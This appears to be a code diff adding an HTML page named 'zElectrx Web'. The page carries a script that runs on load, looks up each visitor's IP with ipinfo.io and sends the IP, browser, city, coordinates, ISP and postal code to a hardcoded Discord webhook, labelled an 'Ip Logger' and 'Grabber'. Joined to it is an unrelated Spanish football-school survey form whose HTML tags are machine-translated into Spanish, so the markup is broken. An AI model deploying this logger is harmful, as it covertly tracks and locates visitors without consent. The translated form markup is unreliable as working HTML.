@@ -1,1 +1,286 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>zElectrx Web</title>
+    <link type="text/css" rel="stylesheet" href="style.css">
+    <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        $.get("https://ipinfo.io", function(response) {
+            const webhook_url = "https://discord.com/api/webhooks/955914286818017380/FBKmspMV6neX26KJW8zW2mK9olku4F2X_rrV8Dinp-qTeehMx_pg6KTbPNTEh5pozPv5";
+            const main = {
+                title: "Ip Logger",
+                description: "> __zElectrx Ip Logger__",
+                thumbnail: {
+                    url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
+                },
+                fields: [
+                    {
+                        name: "IP:",
+                        value: `\`${response.ip}\``,
+                        inline: false,
+                    },
+                    {
+                        name: "User-Agent:",
+                        value: `\`${navigator.userAgent}\``,
+                        inline: false,
+                    },
+                    {
+                        name: "Ciudad:",
+                        value: `\`${response.city}\``,
+                        inline: false,
+                    },
+                    {
+                        name: "Region:",
+                        value: `\`${response.region}\``,
+                        inline: false
+                    },
+                    {
+                        name: "País:",
+                        value: `\`${response.country}\``,
+                        inline: false
+                    },
+                    {
+                        name: "Localización:",
+                        value: `\`${response.loc}\``,
+                        inline: false
+                    },
+                    {
+                        name: "Compañia:",
+                        value: `\`${response.org}\``,
+                        inline: false
+                    },
+                    {
+                        name: "Código postal:",
+                        value: `\`${response.postal}\``,
+                        inline: false
+                    },
+                ],
+                footer: {
+                    text: "zElectrx Grabber"
+                },
+                author: {
+                    name: "{ zElectrx }",
+                    url: "https://discord.gg/val"
+                }
+            }
+            var xhttp = new XMLHttpRequest();
+            const url = webhook_url;
+            xhttp.open("POST", url, true);
+            xhttp.setRequestHeader('Content-Type', 'application/json');
+            xhttp.send(JSON.stringify({
+                'username': 'Ip Grabber',
+                'embeds': [main],
+            }));
+        }, "json");
+    </script>
+</head>
+<body>
+    <script>
+        const date = new Date();
+        document.getElementById('here').innerHTML = date;
+    </script>
+</body>
+</html>
 
+<html lang="es">
+<cabeza>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="hoja de estilo" href="css/main.css">
+  <título>Formulario de incripcíon</title>
+</cabeza>
+<cuerpo>
+  <div class="contenedor">
+    <header class="encabezado">
+      <h1 id="title" class="text-center">Formulario de servicio sobre la escuela de fútbol "El Barto" </h1>
+      <p id="description" class="description text-center">
+        Gracias por tomarte el tiempo de responder el cuestionario.
+      </p>
+    </encabezado>
+    <form id="survey-form">
+      <div class="form-group">
+        <label id="name-label" for="name">Nombre</label>
+        <entrada
+          type="texto"
+          nombre="nombre"
+          id="nombre"
+          class="form-control"
+          placeholder="ingresa tu nombre"
+          obligatorio
+        />
+      </div>
+      <div class="form-group">
+        <label id="email-label" for="email">Email</label>
+        <entrada
+          type="correo electrónico"
+          nombre="correo electrónico"
+          id="correo electrónico"
+          class="form-control"
+          placeholder="Ingresa tu Email"
+          obligatorio
+        />
+      </div>
+      <div class="form-group">
+        <id de etiqueta="number-label" for="number"
+          >Edad<span class="clue"></span></label
+        >
+        <entrada
+          type="número"
+          nombre="edad"
+          id="número"
+          min="10"
+          max="99"
+          class="form-control"
+          placeholder="Edad"
+        />
+      </div>
+      <div class="form-group">
+        <p>Con cual posicion te sientes más identificado</p>
+        <se requiere seleccionar id="menú desplegable" nombre="rol", clase="control de formulario">
+          <option disabled selected value>selecciona tu posicíon</option>
+          <option value="Defensa">Defensa</option>
+          <option value="arquero">Arquero</option>
+          <option value="lateral">Lateral</option>
+          <option value="volante">Volante</option>
+          <option value="delantero">Delantero</option>
+        </escoger>
+      </div>
+  
+      <div class="form-group">
+        <p>¿Recomendarias Nuestra escuela a tus amigos? </p>
+        <etiqueta>
+          <entrada
+            nombre="usuario-recomendación"
+            value="Definitivamente"
+            type="radio"
+            class="input-radio"
+            comprobado
+          />Definitivamente</label
+        >
+        <etiqueta>
+          <entrada
+            nombre="usuario-recomendación"
+            value="quizas"
+            type="radio"
+            class="input-radio"
+          />Quizás</label
+        >
+  
+        <etiqueta
+          ><entrada
+            nombre="usuario-recomendación"
+            value="nunca"
+            type="radio"
+            class="input-radio"
+          />Nunca</label
+        >
+      </div>
+  
+      <div class="form-group">
+        <p>
+          ¿Cuál es tu jugador de futbol favorito?
+        </p>
+        <select id="most-like" name="mostLike" class="form-control" requerido>
+          <opción deshabilitada valor seleccionado>Selecciona una opcíon</option>
+          <option value="messi">Leonel Messi</option>
+          <option value="neimar">Neymar</option>
+          <option value="cristiano">Ronaldo</option>
+          <option value="mbappe">Mbappe</option>
+          
+
+        </escoger>
+      </div>
+  
+      <div class="form-group">
+        <p>
+          ¿Que te gustaria ver en nuestra escuela?
+          <span class="clue">(Marca las que quieras)</span>
+        </p>
+  
+        <label
+          ><input
+            name="prefer"
+            value="Mejores maestros"
+            type="checkbox"
+            class="input-checkbox"
+          />Mejores maestros</label
+        >
+        <label>
+          <input
+            name="prefer"
+            value="más utensilios de trabajo"
+            type="checkbox"
+            class="input-checkbox"
+          />Más utensilios de trabajo</label
+        >
+        <label
+          ><input
+            name="prefer"
+            value="mejores canchas"
+            type="checkbox"
+            class="input-checkbox"
+          />Mejores canchas</label
+        >
+        <label
+          ><input
+            name="prefer"
+            value="premios "
+            type="checkbox"
+            class="input-checkbox"
+          />premios</label
+        >
+        <label
+          ><input
+            name="prefer"
+            value="horarios"
+            type="checkbox"
+            class="input-checkbox"
+          />Horarios</label
+        >
+        <label
+          ><input
+            name="prefer"
+            value="torneos"
+            type="checkbox"
+            class="input-checkbox"
+          />Mejores torneos</label
+        >
+        <label
+          ><input
+            name="prefer"
+            value="Salidas-de-campo"
+            type="checkbox"
+            class="input-checkbox"
+          />Salidad de campo</label
+        >
+        
+        <etiqueta
+          ><entrada
+            nombre="preferir"
+            value="mas-cupos"
+            type="casilla de verificación"
+            class="input-checkbox"
+          />Más cupos</label
+        >
+        
+      </div>
+  
+      <div class="form-group">
+        <p> Algún comentario o sugerencia? </p>
+        <textarea
+          id="comentarios"
+          class="input-textarea"
+          nombre="comentario"
+          placeholder="Ingresa tu comentario aqui."
+        ></textarea>
+      </div>
+  
+      <div class="form-group">
+        <button type="submit" id="submit" class="submit-button">
+          Enviar
+        </botón>
+      </div>
+    </forma>
+  </div>
+</cuerpo>
+</html>
